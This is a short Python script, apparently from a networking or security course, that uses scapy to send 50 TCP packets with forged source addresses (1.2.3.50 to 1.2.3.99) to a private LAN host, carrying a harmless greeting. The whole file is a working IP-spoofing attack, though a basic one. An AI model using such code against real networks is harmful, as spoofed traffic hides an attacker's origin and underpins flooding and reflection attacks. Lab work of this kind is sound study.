"""
Authors : Fridez Lucas, Maxime Welcklen
Attack :  Very basic TCP spoofing over N packets
"""
from scapy.all import *


A = "1.2.3." # spoofed source IP address without the last number
B = "192.168.1.103" # destination IP address
C = RandShort() # source port
D = 9999 # destination port
payload = "Hello from scappy spoofing !" # packet payload


# Send 50 packets to be really visible
for i in range(50,100):
    spoofed_packet = IP(src=f"{A}{i}", dst=B) / TCP(sport=C, dport=D) / payload
    send(spoofed_packet, iface="enp0s3")